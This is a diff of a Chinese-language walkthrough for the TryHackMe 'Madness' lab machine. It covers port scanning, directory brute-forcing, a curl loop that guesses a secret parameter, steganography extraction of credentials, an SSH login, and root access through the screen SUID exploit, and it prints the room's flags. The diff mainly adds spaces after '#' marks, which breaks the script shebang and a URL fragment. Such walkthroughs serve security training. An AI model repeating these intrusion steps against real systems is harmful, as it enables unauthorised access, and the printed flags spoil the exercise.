@@ -1,7 +1,7 @@
-#服务发现
+# 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/Madness]
-└─# nmap -sV -Pn 10.10.123.91          
+└─#  nmap -sV -Pn 10.10.123.91          
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 23:19 EDT
 Nmap scan report for 10.10.123.91
@@ -17,10 +17,10 @@ Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
 
 ```
 
-#目录爆破
+# 目录爆破
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100 -u http://10.10.123.91
+└─#  python3 dirsearch.py -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100 -u http://10.10.123.91
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -36,7 +36,7 @@ Target: http://10.10.123.91
 [23:26:05] 403 -  278B  - /server-status  
 ```
 
-#主页分析
+# 主页分析
 没有任何目录，只有一个首页
 网页源代码里有一行注释
 >They will never find me
@@ -48,7 +48,7 @@ Target: http://10.10.123.91
 用exiftool分析文件,发现按照文件分析这本来是一个png文件，但是却以jpg作为后缀
 ```
 ┌──(root💀kali)-[~/tryhackme/Madness]
-└─# exiftool thm.jpg
+└─#  exiftool thm.jpg
 ExifTool Version Number         : 12.16
 File Name                       : thm.jpg
 Directory                       : .
@@ -66,7 +66,7 @@ Warning                         : PNG image did not start with IHDR
 查看图片源，文件头声明是PNG
 ```
 ┌──(root💀kali)-[~/tryhackme/Madness]
-└─# head thm.jpg
+└─#  head thm.jpg
 �PNG
 ▒
 ��C
@@ -75,10 +75,10 @@ Warning                         : PNG image did not start with IHDR
 ▒▒��C
 �����
 
-���}!1AQa"q2��#B��R��$3br�
+���}!1AQa"q2��# B��R��$3br�
 ▒▒%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������
 
-���w!1AQaq"2B����       #3R�br�
+���w!1AQaq"2B����       # 3R�br�
 $4�%�▒▒&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������
 
 ```
@@ -112,9 +112,9 @@ hidden directory
 
 网页发送了变化：Secret Entered: 0
 
-#编写一个bash脚本，遍历0~99的请求参数，把结果输出到answer.txt
+# 编写一个bash脚本，遍历0~99的请求参数，把结果输出到answer.txt
 ```
-#!/bin/bash
+# !/bin/bash
 for i in {0..100}
 do 
     curl http://10.10.123.91/th1s_1s_h1dd3n/?secret=$i >> answer.txt
@@ -157,12 +157,12 @@ done
 结果原来是图片隐写的密码
 ```
 ┌──(root💀kali)-[~/tryhackme/Madness]
-└─# steghide extract -sf thm.jpg
+└─#  steghide extract -sf thm.jpg
 Enter passphrase: 
 wrote extracted data to "hidden.txt".
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/Madness]
-└─# cat hidden.txt 
+└─#  cat hidden.txt 
 Fine you found the password! 
 
 Here's a username 
@@ -177,7 +177,7 @@ I didn't say I would make it easy for you!
 惊不惊喜
 意不意外
 
-解密出来是：```joker```，参考[这个网站](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=d2J4cmU)
+解密出来是：```joker```，参考[这个网站](https://gchq.github.io/CyberChef/# recipe=ROT13(true,true,false,13)&input=d2J4cmU)
 
 现在有了用户名和密码，以为终于可以登录ssh了，结果密码是错的
 
@@ -185,15 +185,15 @@ I didn't say I would make it easy for you!
 ```
 wget https://i.imgur.com/5iW7kC8.jpg
 ```
-#解析出隐藏文件
+# 解析出隐藏文件
 ```
 ┌──(root💀kali)-[~/tryhackme/Madness]
-└─# steghide extract -sf 5iW7kC8.jpg                                                                                                                                                                                                    1 ⨯
+└─#  steghide extract -sf 5iW7kC8.jpg                                                                                                                                                                                                    1 ⨯
 Enter passphrase: 
 wrote extracted data to "password.txt".
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/Madness]
-└─# cat password.txt    
+└─#  cat password.txt    
 I didn't think you'd find me! Congratulations!
 
 Here take my password
@@ -202,12 +202,12 @@ Here take my password
 
 ```
 
-#真是骚到飞起！
+# 真是骚到飞起！
 
 现在登录ssh，拿到user.txt
 ```
 ┌──(root💀kali)-[~/tryhackme/Madness]
-└─# ssh joker@10.10.123.91          
+└─#  ssh joker@10.10.123.91          
 joker@10.10.123.91's password: 
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)
 
@@ -231,7 +231,7 @@ THM{d5781e53b130efe2f94f9b0354a5e4ea}
 joker@ubuntu:~$ 
 ```
 
-#提权
+# 提权
 传leapeas，枚举提权漏洞信息，发现screen 这个SUID可以提权
 
 提权攻击脚本见[这里](https://www.exploit-db.com/exploits/41154)
@@ -266,9 +266,9 @@ joker@ubuntu:/tmp$ ./exp.sh
 [+] Triggering...
 ' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
 [+] done!
-# id
+#  id
 uid=0(root) gid=0(root) groups=0(root),1000(joker)
-# cat /root/root.txt
+#  cat /root/root.txt
 THM{5ecd98aa66a6abb670184d7547c8124a}
-# 
+#  
 ```
